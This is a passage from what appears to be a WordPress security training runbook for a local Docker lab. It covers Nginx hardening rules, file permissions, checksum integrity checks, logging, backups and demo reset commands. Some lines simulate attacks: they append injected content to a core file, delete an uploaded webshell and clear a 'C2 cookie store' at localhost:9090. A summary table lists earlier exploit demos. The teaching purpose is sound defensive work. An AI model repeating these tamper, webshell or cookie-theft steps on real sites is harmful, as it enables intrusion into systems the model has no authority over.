  "SELECT table_name, ROUND(data_length/1024/1024,2) AS data_mb, table_rows FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY data_length DESC;"
```

### [12.5] Before/after cleanup — live fix

```bash
# Seed the bloat (if not already done — idempotent, safe to re-run)
docker compose exec wordpress wp-bloat.sh

# Record performance baseline BEFORE cleanup
docker compose exec wordpress wp-perf-test.sh before

# Now run the Section 12.1–12.4 queries above to show the "before" state:
# - Autoload: ~5 MB   Revisions: 25,000+   Expired transients: 800
# - Products: 1,000   Product meta: ~12,000 rows
# - Spam: 750   Auto-drafts: 250   Orphaned meta: 4,500

# Run the cleanup — shows BEFORE and AFTER in one output
docker compose exec wordpress wp-cleanup.sh

# Measure AFTER and print diff table
docker compose exec wordpress wp-perf-test.sh after
```

- **Expected before**: Autoload ~5+ MB, 25,000+ revisions (20,000 post + 5,000 product), **1,000 WooCommerce products** with ~12,000 product meta rows, 800 expired transients, 750 spam, 250 auto-drafts, 4,500 orphaned meta rows
- **Expected after**: Autoload ~0.05 MB, 0 revisions, 0 products, 0 expired transients, all zeros
- **Key message**: Every single one of these is a standard maintenance task. Most production WordPress sites never run any of them.

**Full set of hygiene queries:** see `demos/db-hygiene-queries.sql`

---

## Block 3: Infrastructure Prevention

---

## Section 13: Nginx Hardening

### [13.1] Show the hardened config structure

Open `config/nginx-hardened.conf` and walk through each zone:

**Rate limiting definitions (top of file):**
```nginx
limit_req_zone $binary_remote_addr zone=wp_login:10m rate=3r/m;   # 3 login attempts/minute
limit_req_zone $binary_remote_addr zone=wp_xmlrpc:10m rate=1r/m;  # 1 XML-RPC req/minute
```

**Block PHP execution in uploads — kills webshell demo:**
```nginx
location ~* /wp-content/uploads/.*\.php$ {
    deny all;
    return 403;
}
```
- **Demo point**: If this rule were active during Section 6, the uploaded `shell.php` would return 403 even after successful upload. Defence in depth — even if the upload check fails, execution is blocked at the edge.

**Block sensitive files:**
```nginx
location ~* /(wp-config\.php|readme\.html|license\.txt|\.htaccess|\.env) {
    deny all;
    return 404;  # 404 not 403 — don't reveal the file exists
}
```

**Block user enumeration (Section 1 attacks):**
```nginx
location ~* /wp-json/wp/v2/users { deny all; return 403; }
if ($args ~* "author=\d+") { return 403; }
```

**Security headers:**
```nginx
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self';" always;
```
- CSP `script-src 'self'` would block the XSS fetch to `:9090` in Section 3.

**IP-restricted wp-admin (commented out — show as option):**
```nginx
# location /wp-admin/ {
#     allow 192.168.1.0/24;  # office network
#     deny all;
# }
```

**Talking point:** These rules block entire attack categories at the edge — before PHP even starts. Cost: 10 minutes to configure. Return: 80% reduction in automated attack surface.

---

## Section 14: Read-Only Protections

### [14.1] Block plugin/theme editing from the admin UI

```bash
docker compose exec wordpress wp config set DISALLOW_FILE_EDIT true --raw --allow-root
docker compose exec wordpress wp config set DISALLOW_FILE_MODS true --raw --allow-root
```

- **What it does**:
  - `DISALLOW_FILE_EDIT` — removes the Plugin Editor and Theme Editor from the admin menu. An attacker who gets admin access via credential theft or CSRF cannot inject PHP through the UI.
  - `DISALLOW_FILE_MODS` — additionally blocks plugin/theme installation and auto-updates from the dashboard. Deployments happen only through CI/CD.
- **Expected result**: After setting, go to `http://localhost:8080/wp-admin/` → Plugins menu loses "Editor" option

### [14.2] File permission hardening

```bash
docker compose exec wordpress bash -c '
  echo "=== Current permissions on sensitive files ==="
  ls -la /var/www/html/wp-config.php
  ls -la /var/www/html/wp-content/uploads/
  echo ""
  echo "=== Recommended production permissions ==="
  echo "wp-config.php ........... 440  (owner read, group read, no world)"
  echo "All .php files .......... 644"
  echo "All directories ......... 755"
  echo "wp-content/uploads/ .... 755  (writable by www-data only)"
'
```

**Apply hardened permissions:**
```bash
docker compose exec wordpress bash -c '
  find /var/www/html -type f -name "*.php" -exec chmod 644 {} \;
  find /var/www/html -type d -exec chmod 755 {} \;
  chmod 440 /var/www/html/wp-config.php
'
```

**In containerised production:** mount the WordPress filesystem read-only, with only `wp-content/uploads/` as a writable volume. The webshell upload in Section 6 would fail at the filesystem level before any PHP code runs.

---

## Block 4: Protection & Monitoring

---

## Section 15: Integrity Checking

### [15.1] Tamper with a WordPress core file (simulate post-compromise)

```bash
docker compose exec wordpress bash -c \
  "echo '<!-- injected by attacker -->' >> /var/www/html/wp-includes/version.php"
```

### [15.2] Detect the modification

```bash
docker compose exec wordpress wp core verify-checksums --allow-root
```

- **Expected result**: `Warning: File has been modified: wp-includes/version.php`
- **Evidence**: WP-CLI downloads the official checksum manifest from wordpress.org and compares SHA256 hashes of every core file. One modified byte = detected.

### [15.3] Restore clean core files

```bash
docker compose exec wordpress wp core download --force --allow-root
docker compose exec wordpress wp core verify-checksums --allow-root
# → Success: WordPress installation verifies against checksums.
```

### [15.4] Check plugins and themes

```bash
docker compose exec wordpress wp plugin verify-checksums --all --allow-root
docker compose exec wordpress wp theme verify-checksums --all --allow-root
```

**Automate as a cron job:**
```bash
# /etc/cron.d/wp-integrity  — runs every 6 hours, emails on failure
0 */6 * * * www-data wp --path=/var/www/html core verify-checksums --allow-root 2>&1 \
  | grep -v "^$" | mail -s "[ALERT] WordPress integrity check" admin@yourdomain.com
```

**Complementary OS-level tools:** AIDE, Tripwire, or OSSEC for filesystem-wide integrity monitoring beyond WordPress core files.

---

## Section 16: Activity Logging & Backup Strategy

### [16.1] Show the debug log (hardening plugin writes to it)

```bash
# Trigger a failed login to generate a log entry
curl -s -d 'log=admin&pwd=wrongpassword123' 'http://localhost:8080/wp-login.php' > /dev/null

# View the log
docker compose exec wordpress tail -20 /var/www/html/wp-content/debug.log
```

- **Expected result**: Timestamped entries from the hardening plugin recording failed login attempts, the source IP, and the attempted username
- **Evidence**: Demonstrates how authentication events can be captured for audit trails and intrusion detection

### [16.2] Manual DB backup with WP-CLI

```bash
docker compose exec wordpress wp db export /tmp/backup-$(date +%Y%m%d-%H%M).sql --allow-root
docker compose exec wordpress ls -lh /tmp/backup-*.sql
```

- **3-2-1 rule**: 3 copies (live + local + off-site), 2 media types, 1 off-site (UpdraftPlus → S3)
- **Back up**: DB, uploads (`wp-content/uploads/`), `wp-config.php`
- **Don't back up**: core, plugins, themes — reproducible
- **Test restores monthly** — an untested backup is not a backup

---

## Quick Reference Table

| # | Topic | OWASP | Key Demo | Fixed With | Key Evidence |
|---|-------|-------|----------|-----------|--------------|
| 1 | Enumeration | A07 | `vuln_debug_info`, REST API, `?author=` | Disable REST, remove generator | PHP version, usernames, server OS |
| 2 | SQL Injection | A03 | `vuln_search` | `vuln_search_fixed` | Full credential dump via UNION |
| 3 | XSS (Stored/Reflected) | A03 | `vuln_guestbook_submit` | `esc_html()` output | Cookie theft to attacker C2 |
| 4 | CSRF | A01 | `vuln_change_email` | `wp_verify_nonce()` | Silent admin email change |
| 5 | IDOR | A01 | `vuln_get_user`, `vuln_get_post` | `current_user_can()` | Unauthenticated user/post access |
| 6 | File Upload | A04 | `vuln_upload` | `vuln_upload_fixed` | PHP webshell → `uid=33(www-data)` |
| 7 | RCE | A03 | `vuln_calculator` | `vuln_calculator_fixed` | `system('id')` via `eval()` |
| 8 | WPScan | — | All of the above | — | Automated enumeration + brute-force |
| 9 | Supply Chain | A08 | `functions.php` backdoors, `social-icons.php` webshell | Verify checksums, official sources only | 3 backdoor types, obfuscated `eval()` |
| 10 | PHP Hardening | — | `php-demo.ini` vs `php-hardened.ini` | `disable_functions`, `open_basedir`, `cookie_httponly` | RCE and XSS both blocked by config |
| 11 | Redis Caching | — | `wp redis enable`, `DBSIZE` | Redis Object Cache plugin | SQL queries eliminated for cached objects |
| 12 | DB Hygiene | — | Autoload bloat, revision count | `WP_POST_REVISIONS`, transient cleanup | MB of data loaded on every request |
| 13 | Nginx Hardening | — | Block uploads PHP, rate limit login | `nginx-hardened.conf` | Webshell blocked at edge even after upload |
| 14 | Read-Only | — | `DISALLOW_FILE_EDIT`, permissions | Constants + `chmod 440` | Admin UI can't inject PHP |
| 15 | Integrity Check | — | Tamper core file, verify-checksums | `wp core download --force` | Modified file detected by SHA256 |
| 16 | Logging & Backups | — | `debug.log`, `wp db export` | 3-2-1 backup rule, cron + WP-CLI | Failed logins logged, backups verified |

---

## Demo Reset Commands

```bash
# ── Per-section atomic resets ─────────────────────────────────────────

# Reset guestbook (Section 3 — XSS stored entries)
docker compose exec wordpress wp eval 'global $wpdb; $wpdb->query("TRUNCATE TABLE wp_vuln_guestbook");' --allow-root

# Delete uploaded webshell (Section 6 — file upload)
docker compose exec wordpress rm -f /tmp/shell.php /var/www/html/wp-content/uploads/vuln-demo/shell.php

# Clear attacker loot (Section 3 — C2 cookie store)
curl -s -X DELETE 'http://localhost:9090/loot'

# Restore tampered core file (Section 15 — integrity check)
docker compose exec wordpress wp core download --force --allow-root

# Remove read-only constants set during Section 14 demo
docker compose exec wordpress wp config delete DISALLOW_FILE_EDIT --allow-root || true
docker compose exec wordpress wp config delete DISALLOW_FILE_MODS --allow-root || true

# ── Section 12 re-run (cleanup → re-seed bloat → re-record baseline) ──
docker compose exec wordpress wp-cleanup.sh
docker compose exec wordpress wp-bloat.sh
docker compose exec wordpress wp-perf-test.sh before   # re-record baseline after re-seed

# ── Full reset — wipe everything and rebuild from scratch ─────────────
docker compose down -v && docker compose up -d --build
# wp-setup.sh: installs WP, creates 4 users, activates wp-vuln-demo,
#              installs WooCommerce + redis-cache, enables Redis automatically
docker compose exec wordpress wp-setup.sh
docker compose exec wordpress wp-bloat.sh              # seed all 8 bloat categories
docker compose exec wordpress wp-perf-test.sh before   # record Section 12 perf baseline
# Redis (Section 11) is already enabled by wp-setup.sh — verify with:
#   docker compose exec wordpress wp redis status --allow-root
```

---
# Conclusion

13% TTFB improvement on a localhost demo looks small. In production, your DB is on a separate server — each query eliminated by Redis saves a real network round trip. At scale, Redis is the difference between a site that handles 150 req/s and one that handles 800 req/s, because MySQL stops being the bottleneck. The p99 drop is the number that matters — your slowest users got 10% faster even here."

The p99 -10% and TTFB -13% are actually solid for a single-machine, no-concurrency benchmark. Present them as a lower bound, not the ceiling.
---
---

EOF, only 1080 lines.
